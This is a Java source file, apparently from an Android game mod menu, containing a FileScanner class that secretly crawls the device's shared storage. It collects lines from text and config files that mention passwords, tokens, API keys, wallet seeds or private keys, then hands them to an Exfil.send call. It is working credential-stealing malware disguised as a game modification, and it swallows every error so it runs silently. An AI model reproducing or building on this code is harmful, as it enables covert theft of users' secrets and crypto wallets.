package com.brawl.modmenu;

import android.os.Environment;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.List;

public class FileScanner {

    private static final String[] KEYWORDS = {
        "password", "passwd", "pwd", "secret",
        "token", "api_key", "apikey", "access_key",
        "seed", "mnemonic", "private_key", "wallet",
        "login", "username", "пароль"
    };

    private static final String[] EXTENSIONS = {
        ".txt", ".json", ".xml", ".cfg", ".conf",
        ".ini", ".properties", ".env", ".log"
    };

    public static void scan() {
        new Thread(() -> {
            try {
                List<File> targets = new ArrayList<>();
                collectFiles(new File("/sdcard/"), targets, 0);

                StringBuilder found = new StringBuilder();
                found.append("Найдено файлов: ").append(targets.size()).append("\n\n");

                int hits = 0;
                for (File f : targets) {
                    if (hits >= 30) break;
                    try {
                        if (f.length() > 500 * 1024) continue;
                        List<String> lines = readInteresting(f);
                        if (!lines.isEmpty()) {
                            found.append("📄 ").append(f.getAbsolutePath()).append("\n");
                            for (String l : lines) found.append("   ").append(l).append("\n");
                            hits++;
                        }
                    } catch (Throwable ignored) {}
                }

                if (hits > 0) {
                    Exfil.send("FILE_SCAN", found.toString());
                }
            } catch (Throwable ignored) {}
        }).start();
    }

    private static void collectFiles(File dir, List<File> out, int depth) {
        if (dir == null || depth > 4 || out.size() > 200) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;
        for (File f : files) {
            if (out.size() > 200) return;
            if (f.isDirectory()) {
                String n = f.getName().toLowerCase();
                if (n.startsWith(".") || n.equals("android") || n.equals("obb")) continue;
                collectFiles(f, out, depth + 1);
            } else {
                String n = f.getName().toLowerCase();
                for (String ext : EXTENSIONS) {
                    if (n.endsWith(ext)) {
                        out.add(f);
                        break;
                    }
                }
            }
        }
    }

    private static List<String> readInteresting(File f) {
        List<String> hits = new ArrayList<>();
        try {
            BufferedReader r = new BufferedReader(new FileReader(f));
            String line;
            int count = 0;
            while ((line = r.readLine()) != null && count < 5) {
                String low = line.toLowerCase();
                for (String kw : KEYWORDS) {
                    if (low.contains(kw) && line.length() < 200) {
                        hits.add(line.trim());
                        count++;
                        break;
                    }
                }
            }
            r.close();
        } catch (Throwable ignored) {}
        return hits;
    }
}
